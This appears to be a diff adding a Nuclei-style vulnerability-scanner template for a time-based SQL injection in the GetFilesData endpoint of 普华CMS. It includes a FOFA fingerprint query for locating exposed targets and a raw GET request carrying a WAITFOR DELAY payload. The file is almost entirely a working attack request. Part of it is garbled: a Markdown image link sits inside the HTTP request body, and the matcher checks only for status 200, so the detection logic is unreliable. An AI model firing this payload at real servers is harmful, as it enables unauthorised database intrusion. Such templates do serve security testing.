@@ -1,0 +1,34 @@
+id: poc-rqwbgkg0r4ietd1q
+info:
+  name: 普华CMS GetFilesData存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rqwbgkg0r4ietd1q'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: rqwbgkg0r4ietd1q
+    fofa: body="Power.login.init" && body="Power.ui.warning" && body="Power_login_btn"
+http:
+- raw:
+  - 'GET /UploadFle/GetFilesData?EpsProjId=1%27;WAITFOR+DELAY+%270:0:5%27--&StartDate=2&EndDate=2 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Upgrade-Insecure-Requests: 1
+
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1752856672885-54b7d791-de45-47fb-ba28-d82ceeb355fe.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
